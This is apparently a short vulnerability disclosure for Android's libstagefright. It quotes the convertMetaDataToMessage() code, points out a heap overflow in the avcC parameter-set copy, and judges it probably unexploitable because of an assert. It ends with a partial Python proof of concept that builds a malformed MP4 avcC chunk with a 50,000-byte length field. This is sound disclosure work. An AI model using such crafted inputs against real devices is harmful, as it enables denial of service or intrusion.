Android libstagefright convertMetaDataToMessage() overflow

To get latest libstagefright sources:
$ repo sync frameworks/av
 
Code from libstagefright/Utils.cpp: 

<code>
...
   if (meta->findData(kKeyAVCC, &type, &data, &size)) {

        const uint8_t *ptr = (const uint8_t *)data;
	...

 	uint8_t profile __unused = ptr[1];
        uint8_t level __unused = ptr[3];
        size_t lengthSize __unused = 1 + (ptr[4] & 3);
        size_t numSeqParameterSets = ptr[5] & 31;

        ptr += 6;
        size -= 6;

        sp<ABuffer> buffer = new ABuffer(1024);
        buffer->setRange(0, 0);
	
        for (size_t i = 0; i < numSeqParameterSets; ++i) {
            CHECK(size >= 2);
            size_t length = U16_AT(ptr);

            ptr += 2;
            size -= 2;

            CHECK(size >= length);

            memcpy(buffer->data() + buffer->size(), "\x00\x00\x00\x01", 4);
[1]         memcpy(buffer->data() + buffer->size() + 4, ptr, length);
[2]         buffer->setRange(0, buffer->size() + 4 + length);

            ptr += length;
            size -= length;
        }
	
		
</code>

On line #1 there is a plain heap overflow when 'length' is greater than 1000.
However setRange() call on line #2 will contains call to CHECK_LE macro which will trigger assert() call.
Most probably this bug is not exploitable...

File 1.mp4 contains corrupted avcc chunk:

s='\x01'
s+='\x00\x00\x00' # unused
s+='\x03'
s+='\x01' # numSeqParameterSets

b='X'*50000
s+=struct.pack('>H',len(b))
s+=b
s+='a'*10

chunk=struct.pack('>L',1)
chunk+='avcC'
chunk+=struct.pack('>L',0x0000000))
chunk+=struct.pack('>L', len(s)+16)
chunk+=s


